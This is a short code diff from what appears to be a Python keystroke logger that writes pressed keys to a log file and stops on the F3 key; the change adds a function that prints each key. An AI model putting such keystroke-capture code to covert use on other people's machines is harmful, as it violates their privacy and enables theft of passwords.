@@ -20,6 +20,10 @@ def key_down(key):
             log.write(f' <{key}> ')
 
 
+def key_down_pass(key):
+    print(key)
+
+
 def key_up(key):
     if key == Key.f3:  # Hotkey to end process
         return False
